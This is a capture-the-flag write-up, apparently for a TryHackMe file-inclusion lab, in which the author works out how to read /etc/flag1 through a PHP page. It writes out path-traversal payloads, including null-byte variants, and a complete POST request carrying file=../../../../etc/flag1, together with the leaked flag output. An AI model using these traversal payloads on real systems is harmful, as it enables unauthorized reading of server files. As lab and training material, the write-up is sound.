# Challenge
https://tryhackme.com/room/fileinc?taskNo=8&sharerId=68247202511dfcd72c9cf524 
Capture Flag1 at /etc/flag1

# Information gathering
The first thing that cought my eye was the yellow banner with information.
`The input form is broken! You need to send `POST`request with`file` parameter!`
Ok, first tip noticed. Second thing I've done was using the input. I set the `foobar` inside the input, and fire the Include button.
<br>
<img width="1979" height="720" alt="Screenshot 2026-01-31 at 20 12 25" src="https://github.com/user-attachments/assets/8e6f9f9d-0372-4054-b4f0-fb78600a3796" />
<br>
No error on the frontend, but URL has changed to following `http://10.80.191.5/challenges/chall1.php?file=foobar#`
<br>
<img width="1960" height="798" alt="Screenshot 2026-01-31 at 20 17 26" src="https://github.com/user-attachments/assets/d827727c-8309-44ac-9795-bb000343cd05" />
<br>
Next thing I've done was open the app Caido, and run the same request to check what's in there.
Nothing was there, the form wasn't sent, so I reloaded the page to trigger anything. That helped. I got the http history.
<br>
<img width="1469" height="846" alt="Screenshot 2026-01-31 at 20 20 08" src="https://github.com/user-attachments/assets/dea1c519-22a1-4f28-82ab-948be4c4c06d" />
<br>
I saw the GET request with parameter 
`?files=foobar`. 
I thought that is the entry point and time to work with that. So I started manually path traversal with `etc/flag1`, `../../../../etc/flag1` `etc/flag1%00`, `../../../../etc/flag1%00`. Nothing happened. No error on the frontend. I've changed the http method to the POST with no result.
I sent the request to the Automate feature in Caido to set more path traversal options, but it ended with nothing.
<br>
<img width="1470" height="892" alt="Screenshot 2026-01-31 at 20 27 04" src="https://github.com/user-attachments/assets/0e3de4b2-2a7d-4f4e-8854-f6589c949eb2" />
<br>
I haven't idea what to do next.
I left the challenge for a while and get back to it later.

When I got back to the computer I thought it must something that I am doing wrong. I've done duckduckgo searching about forms and found the answer. <br>

```
Parameter is still in the URL (so it’s still being sent as GET).<br>
If the application only reads POST data, move the parameter into the request body:<br>
...<br>
`POST /challenges/chall1.php HTTP/1.1 ... <br>
...<br>
...<br>
...<br>
file=../../../../etc/flag1`<br>
`Content-Type: application/x-www-form-urlencoded`
```
<br>
That was it. I knew that I am doing something wrong with the request. <br>
It's been a while when I was playing with the forms, etc. I forgot that POST needs body parameter.
<br>
<img width="1469" height="911" alt="Screenshot 2026-02-01 at 18 17 29" src="https://github.com/user-attachments/assets/35153ddf-8225-49fa-b605-d1978aed1df7" />
<br>
<br>
And BANG! The frontend has answered with `<code>F1x3d-iNpu7-f0rrn</code>`

```
<div class='mt-5 mb-5'>
          <h5>Current Path</h5>
          <div class='file-Location'><code>/var/www/html</code></div>
        </div>
        <div>
          <h5>File Content Preview of <b>../../../../etc/flag1</b></h5>
	  <code>F1x3d-iNpu7-f0rrn
</code>
    </div>
```
<br>

# Solution
The correct request.

```
`POST` /challenges/chall1.php? HTTP/1.1
Host: 10.80.191.5
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imageapng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.80.191.5/challenges/chall1.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,pl;q=0.8
Content-Type: application/x-www-form-urlencoded

`file=../../../../etc/flag1`
```
<br>
What's been changed here?<br> 
- HTTP method to `POST`
<br>
- Request body `file=../../../../etc/flag1`
<br>
- New header `Content-Type: application/x-www-form-urlencoded`.
